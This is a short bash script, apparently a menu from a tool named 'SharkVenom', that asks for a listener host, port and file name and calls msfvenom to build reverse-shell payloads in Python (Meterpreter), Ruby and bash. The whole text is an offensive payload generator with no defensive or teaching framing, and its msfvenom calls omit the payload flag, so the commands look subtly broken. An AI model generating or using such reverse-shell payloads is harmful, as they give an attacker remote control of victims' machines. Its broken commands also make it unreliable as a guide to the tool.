read -p "Choose : " evil
if [ "$evil" -eq "01" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport >$name
fi
if [ "$evil" -eq "02" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom ruby/shell_reverse_tcp LHOST=$lhost LPORT=$lport >$name
fi
if [ "$evil" -eq "03" ];then
read -p '[+] LHOST : ' lhost
read -p '[+] LPORT : ' lport
read -p '[+] NAME  : ' name
msfvenom cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport >$name
fi
if [ "$evil" -eq "00" ];then
clear
cd
cd SharkVenom
sh shark.sh
fi



